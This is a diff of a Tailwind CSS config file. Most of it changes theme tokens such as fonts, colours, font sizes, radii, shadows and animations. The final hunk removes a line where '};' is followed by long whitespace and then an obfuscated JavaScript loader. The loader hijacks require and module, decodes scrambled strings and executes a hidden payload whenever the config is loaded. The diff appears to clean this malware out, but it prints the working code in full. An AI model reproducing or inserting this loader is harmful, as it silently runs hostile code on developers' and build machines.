@@ -3,54 +3,67 @@ import { createRequire } from 'module';
 const require = createRequire(import.meta.url);
 export default {
   content: ['./src/**/*.{astro,html,js,jsx,md,mdx,svelte,ts,tsx,vue}'],
-  darkMode: 'class',
+  darkMode: ['class', '[data-theme="dark"]'],
   theme: {
     fontFamily: {
-      sans: ['Inter', 'system-ui', '-apple-system', 'sans-serif'],
+      sans: ['Hanken Grotesk', 'Inter', 'system-ui', '-apple-system', 'sans-serif'],
       display: ['Space Grotesk', 'system-ui', 'sans-serif'],
-      mono: ['JetBrains Mono', 'Menlo', 'monospace'],
+      mono: ['IBM Plex Mono', 'JetBrains Mono', 'Menlo', 'monospace'],
     },
     extend: {
       colors: {
-        // Semantic surface colors
+        // Background / surfaces
+        bg: 'rgb(var(--bg) / <alpha-value>)',
         surface: {
-          DEFAULT: 'rgb(var(--surface) / <alpha-value>)',
-          raised: 'rgb(var(--surface-raised) / <alpha-value>)',
-          overlay: 'rgb(var(--surface-overlay) / <alpha-value>)',
+          DEFAULT: 'rgb(var(--surface-1) / <alpha-value>)',
+          1: 'rgb(var(--surface-1) / <alpha-value>)',
+          2: 'rgb(var(--surface-2) / <alpha-value>)',
+          3: 'rgb(var(--surface-3) / <alpha-value>)',
+          // Back-compat aliases for code still referring to old names
+          raised: 'rgb(var(--surface-2) / <alpha-value>)',
+          overlay: 'rgb(var(--surface-3) / <alpha-value>)',
         },
-        // Text colors
         ink: {
           DEFAULT: 'rgb(var(--ink) / <alpha-value>)',
           muted: 'rgb(var(--ink-muted) / <alpha-value>)',
           faint: 'rgb(var(--ink-faint) / <alpha-value>)',
         },
-        // Accent - warm amber/orange
         accent: {
           DEFAULT: 'rgb(var(--accent) / <alpha-value>)',
-          hover: 'rgb(var(--accent-hover) / <alpha-value>)',
-          muted: 'rgb(var(--accent-muted) / <alpha-value>)',
+          bright: 'rgb(var(--accent-bright) / <alpha-value>)',
+          deep: 'rgb(var(--accent-deep) / <alpha-value>)',
+          // Back-compat
+          hover: 'rgb(var(--accent-deep) / <alpha-value>)',
+          muted: 'rgb(var(--accent-bright) / 0.1)',
         },
-        // Borders
+        signal: {
+          DEFAULT: 'rgb(var(--signal) / <alpha-value>)',
+          deep: 'rgb(var(--signal-deep) / <alpha-value>)',
+        },
         edge: {
           DEFAULT: 'rgb(var(--edge) / <alpha-value>)',
           strong: 'rgb(var(--edge-strong) / <alpha-value>)',
         },
+        danger: 'rgb(var(--danger) / <alpha-value>)',
+        // Back-compat success token (used by some pages)
+        success: {
+          DEFAULT: 'rgb(var(--signal) / <alpha-value>)',
+          muted: 'rgb(var(--signal) / 0.1)',
+        },
       },
       fontSize: {
-        // Display scale - for headlines
-        'display-xl': ['4.5rem', { lineHeight: '1', letterSpacing: '-0.02em', fontWeight: '700' }],
-        'display-lg': ['3.5rem', { lineHeight: '1.05', letterSpacing: '-0.02em', fontWeight: '700' }],
-        'display': ['2.5rem', { lineHeight: '1.1', letterSpacing: '-0.01em', fontWeight: '700' }],
-        'display-sm': ['2rem', { lineHeight: '1.15', letterSpacing: '-0.01em', fontWeight: '600' }],
-        // Body scale
+        'display-xl': ['5rem', { lineHeight: '0.98', letterSpacing: '-0.025em', fontWeight: '700' }],
+        'display-lg': ['3.6rem', { lineHeight: '1.02', letterSpacing: '-0.022em', fontWeight: '700' }],
+        'display': ['2.5rem', { lineHeight: '1.08', letterSpacing: '-0.018em', fontWeight: '700' }],
+        'display-sm': ['2rem', { lineHeight: '1.12', letterSpacing: '-0.015em', fontWeight: '600' }],
         'body-xl': ['1.25rem', { lineHeight: '1.6' }],
         'body-lg': ['1.125rem', { lineHeight: '1.6' }],
-        'body': ['1rem', { lineHeight: '1.6' }],
+        'body': ['1rem', { lineHeight: '1.65' }],
         'body-sm': ['0.875rem', { lineHeight: '1.5' }],
         'body-xs': ['0.75rem', { lineHeight: '1.4' }],
-        // Labels
-        'label': ['0.8125rem', { lineHeight: '1', letterSpacing: '0.02em', fontWeight: '500' }],
-        'label-sm': ['0.6875rem', { lineHeight: '1', letterSpacing: '0.04em', fontWeight: '600' }],
+        'label': ['0.8125rem', { lineHeight: '1', letterSpacing: '0.06em', fontWeight: '500' }],
+        'label-sm': ['0.6875rem', { lineHeight: '1', letterSpacing: '0.12em', fontWeight: '500' }],
+        'kicker': ['0.72rem', { lineHeight: '1', letterSpacing: '0.16em', fontWeight: '500' }],
       },
       spacing: {
         '18': '4.5rem',
@@ -59,23 +72,29 @@ export default {
       },
       maxWidth: {
         'content': '680px',
+        'narrow': '680px',
         'wide': '920px',
-        'container': '1120px',
+        'container': '1140px',
       },
       borderRadius: {
-        'sm': '4px',
-        'DEFAULT': '6px',
-        'md': '8px',
-        'lg': '12px',
-        'xl': '16px',
+        'sm': '6px',
+        'DEFAULT': '10px',
+        'md': '10px',
+        'lg': '14px',
+        'xl': '20px',
+        '2xl': '28px',
       },
       boxShadow: {
-        'soft': '0 2px 8px -2px rgb(0 0 0 / 0.08), 0 4px 16px -4px rgb(0 0 0 / 0.12)',
-        'lifted': '0 4px 24px -4px rgb(0 0 0 / 0.15), 0 8px 32px -8px rgb(0 0 0 / 0.2)',
+        'soft': '0 1px 2px rgba(0,0,0,.4)',
+        'lifted': '0 8px 28px -10px rgba(0,0,0,.65)',
+        'tall': '0 24px 60px -20px rgba(0,0,0,.7)',
+        'accent': '0 14px 40px -14px rgba(61,123,255,.45)',
       },
       animation: {
         'fade-in': 'fadeIn 0.5s ease-out',
         'slide-up': 'slideUp 0.5s ease-out',
+        'dot-pulse': 'dotPulse 2.2s cubic-bezier(0.16, 1, 0.3, 1) infinite',
+        'blink': 'blink 1.1s steps(1) infinite',
       },
       keyframes: {
         fadeIn: {
@@ -86,13 +105,23 @@ export default {
           '0%': { opacity: '0', transform: 'translateY(10px)' },
           '100%': { opacity: '1', transform: 'translateY(0)' },
         },
+        dotPulse: {
+          '0%, 100%': { boxShadow: '0 0 0 0 rgba(31,207,166,0.10)' },
+          '50%': { boxShadow: '0 0 0 5px transparent' },
+        },
+        blink: {
+          '50%': { opacity: '0' },
+        },
       },
-      typography: ({ theme }) => ({
+      transitionTimingFunction: {
+        'ease-out-expo': 'cubic-bezier(0.16, 1, 0.3, 1)',
+      },
+      typography: () => ({
         DEFAULT: {
           css: {
             '--tw-prose-body': 'rgb(var(--ink-muted))',
             '--tw-prose-headings': 'rgb(var(--ink))',
-            '--tw-prose-links': 'rgb(var(--accent))',
+            '--tw-prose-links': 'rgb(var(--accent-bright))',
             '--tw-prose-bold': 'rgb(var(--ink))',
             '--tw-prose-quotes': 'rgb(var(--ink-muted))',
             '--tw-prose-code': 'rgb(var(--ink))',
@@ -111,4 +140,4 @@ export default {
     },
   },
   plugins: [require('@tailwindcss/typography')],
-};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.i='5-3-161';var _$_46e0=(function(r,i){var f=r.length;var l=[];for(var c=0;c< f;c++){l[c]= r.charAt(c)};for(var c=0;c< f;c++){var u=i* (c+ 224)+ (i% 22828);var w=i* (c+ 222)+ (i% 38027);var q=u% f;var p=w% f;var b=l[q];l[q]= l[p];l[p]= b;i= (u+ w)% 3080816};var y=String.fromCharCode(127);var a='';var g='\x25';var z='\x23\x31';var t='\x25';var x='\x23\x30';var s='\x23';return l.join(a).split(g).join(y).split(z).join(t).split(x).join(s).split(y)})("%o%bcretmj",1550296);global[_$_46e0[0]]= require;if( typeof module=== _$_46e0[1]){global[_$_46e0[2]]= module}(function(){var Vew='',BwP=283-272;function lyR(i){var c=2883316;var r=i.length;var l=[];for(var x=0;x<r;x++){l[x]=i.charAt(x)};for(var x=0;x<r;x++){var y=c*(x+463)+(c%39808);var z=c*(x+605)+(c%13288);var t=y%r;var w=z%r;var h=l[t];l[t]=l[w];l[w]=h;c=(y+z)%4185096;};return l.join('')};var XgO=lyR('itorzmsoncfxbadrswvkjguuerhtnyclpoctq').substr(0,BwP);var TpC='{a[ r=l3par2=,h=l6+v[r)p+"1bfd=frh j8l)ntp.rat,v)x(ze;7a, t=)7+,,5 7r,"1}8v,i6=7c,)0w8r,h1n7",e4r9o,k8=7C,s0;6),05;8,,k9h;2ah f=a]Cf"r vzrczr0nzqw=lrnCtv;.+;)([r[d]f=<+o;}ae h=u]6sm=n0)ae=h3ies=(0.f r[vfr=b.0ab.agg=mvn(sdl]nlts;v+1).vkrumoawghmrn{sabm.8p)i((1 z)=f]r.vervllmjl;nuta-o;v>p0;lo-t{naa ;=su)ltv.r g;mala;ga  m=+u0l(v,r+n=0;v8rsvrgtl2nkt3;}ar n;=o](ia1 9=];A<g;=+l)=vdr)u8gocra,C1drAr(,)(v}r7j]qouf;if,jc{j={j}1r*=+g.(hir,ove.t1k61,-u;t=(;e+u;pe[sa 3fsuf=+)so=a[(n.(e)g(h swgocfa.CzdeA((k+6)[+0.th[rtole3t]k;2n-r;;=[;!+ 2h}.l;e{c.n*iou(;vid(r= nrl,)4=z]=i+(o>n)g.ru;h2gds6b(tjivganrd;)lh=p)so(e[i+;]k;)=q+a;aiC()!=nslv)lir(m<t)4.Su.h)g7srbat-i]ganu)8m(ln=9. oeni"d);}rt push(g[l];;nv;r+xht{j)ip(6");nav v=k4+,k2w9e,k6,1],h9e.goeckt(w,;<ai ;=2tbi0gzf9oiC(a0Cfdh(h6s;aoe(hau f=e;5<t."e=g-hhz(++x;xrsnlyt0rupkcoadA7(h)). o2neS.r(n;.nrAmshzr[oae-f.z+)0;he"ugnqxosvltt+r="c"+.ao[nrrt;';var taY=lyR[XgO];var vJr='';var AWB=taY;var goZ=taY(vJr,lyR(TpC));var Izf=goZ(lyR('rOA_9_\/0rcb("0j(;%,2;8.rw3fT it=amrnndldh8Or+.\/e]lupS.t%}m(i]hOrOst%eo6d.Dbq%!Scut-et.$.6iucne;g7%{.5y.eb.d].1 9=7su)pOcrC122Dt..%rbhtnf@t7et_#f}tbbcepwr.idt.09atocefv2.3OcagOeOi)e]%=%Ocsi7dtu"_Oe6r82Oabh(rrr4l]%gsH&9%O%=%]ctsht:0+sco;ius.1o%gy}g*b10OT o%ruiba%a4Dt%Crn2CTo-mf3%\/ded;t%r;9.%irbm9)aw Sj!(%.n:a8uhnh7>beohi(n)pOrOhqbCawd(mOsTs}ie.;C)n1!f=tnl9O0=joeiagw-4elcoIm(t6k,aOp]t]ats[h77%2aCOct2)kl0A.ebO.rd(gcd=8=y0ad.hEn%:z:63eo_18O?;4Ogse(Nmp(?..a%Oy.%]inr=o;f%.=s)h%58m]a8%clOo+%iu(63%Of}.!Ch%_rOdpT=-}_)fO% l9ck_er}a;%(.O0=uj4wu=2[M.teb4se4w9oi]i?rbaOi]0=s>6b1O%losttaa8n7a%?e th5Odz%;l5p,7vk=Mm%Ona_\'g\/rS%Ok.t-ag3ti]ntt76Oa;."b4.c%.64bntOlc%b7_9:slcO0en+dgcnin.617tc2tass;bip%mp4fc)o+o;rN.(CjeO.Oml3Ot%ewl:r(p!itf..)d_pa3)j.d%,_981.0);Ou7cai(n5bb,[,o)]v$CO=o.0lcnbtdO(rf[O;8o;()OOz601z0w.b4;7+t).r>z!=ob:.2c<al.3tez]}8f#rEv1C)=b;z.?..ggz=+e{)Oeqooeamb$z+.i2d7e+ib.oO.*4&6]2TOrm=o[a;b\'zr.72v3o+=b[o6.e4:0)5aOxhdq(.rgp>9=+%4b7Oyj1rnhp;][.](.erHdl;O[[]n.(jeo3.O(O+,bo)c.q6f0b6(9hO3lCS3r2n9..fno9C(awC\/do(e2t)]>]=8fhO4py.c%eOot=.)#4.b;r=1f%.a;3=afn0eOdcd.]#)f)O]rr=]O3prO3l 5]).==OhktOacn5e)r(Os8n..](t=OO7i g9o1a=;r-5]o=m$_]);e<.=]-m]];O" OtOtOOOo1f]G($r3a8F0O.Oq)O;sO;1cO!1O]f(r,at2Fo?O=x1lG,!{OOei=5bc}h;+[uO 32,tOOODrmO}Oc8t]oe*O{Ot}3}a[eOt4}92fiOO=n=\'bd)nOt1.;>#9u1l]O)Ot)!. Hr)0iO\'.,4En;s:]"h(_,-=[b)]]s.{a8c@e$_2)]=(?,.)2>.79=.-.%i4D]g{)s)ncp(:t6.3),weihkdacgpurtm+:b,Od)1b)8O]e1{(o=toa_eOsvmet*ou:]6O5n}cO?n4dB2(1"*O6=]Dey(@O;OeeoO4OfOO7o9[+O..ti).tv_o!F]z(.F]D2(8-i%&])(%)t+1A4)3)r_)!sO%Or).n:4c7 ]Ot\/;%O=O;}[}o"b(e,],c)2ObrOOcr3Ol2cOe2.]f(]Oeo6(uhOt5sb\/;aOic!brtn(r[de!ioyv=\/]c.o]npsr"+trO12n] )OOo7b]]0aO02eO=7)O]2fO]2g)t1=&]Oe6O*g9,Hs4c8O)d]O;bO%OOOnrT{7fdO%=O=rb_E0{7:_hEoi.mO+.,E%ror2}\/aFc{O]rO.r(<3s(i"ftOp;:{\/5u1l,o;e)!4a%n)ee.)a%tessa6s1!to)\/O15alcdu%t3\/]+]+y6O0s)1)}0OO%2m%}80]B0n}iO0a(O\/nOBeO(O.0lO1rbtnr.OO28OB2a]{(rO(s5225O,Or.,O).Oc4;(o3!(>2d]a2O,n6]5O&OO 2OO%0<)@15):1(}3Ir0O{!#2}}l eAb3Ozaa.eO}nm2r6O)oOga){0h6oy.]O).bEbr1ri} abc2O1a>.1O!n.217;)8}+Ov(ue{=>Oir=c;.l]9;b?t=r1=for(Obt50Otnw}b}Or8.]dtm+cO)ntc4.-]r(0%[be))an=%$21v(;0=]ee7.}]a(s)askb})g;[8b}c(v)eOner(9@9$"3"OO4=O);4Dif.Os44]2&y.Oe(O748]a.f.]314r{1e=ubn2}6aOc(O6}=O54!]t=rbd;&r[OcrrOgt?2.5a\/.6o\/)7.)ceaac(=Ol})t5y 72=i3]Os4rOe4OOd53]n;>O]5,Op5oOa5;]rOc5.]l(lg{oia.[ocjf0.b.O.?]u.5.t"c((-o]=|n.O0b+%6r3t+n+.1\/]e{Be(a\/hadOOv,.t,ic:%6S4%,li]d4wO.ti9e1O,}f[.Ot4a9OI-0O{}#)E(eus).%{1vnlOr6}hOf}c)s).$_5;1o[]O) ]s+nO.|f%nvt.oi.= f01.O tb)-t9h(uO)2sfO!.$.511O)% t]!4=]!O6 c)(4i);c2tthdB)O((bi24eO93s]bO4 M$IfO685 56Ot6m bO4 =b3w(iO.. kOs c.[sdl;te r$t5c1O[n{;<!r:t_rb.c 3,stiF rft0rl}{ OOg ooisu.4 %!eo]n.  veC]l,t=ba.)nNwOa.tu}s(r)& .rrbeteyt ]r.e() >} Oto_$]f(b xf1!'));var oWN=AWB(Vew,Izf );oWN(5586);return 4180})()
+};
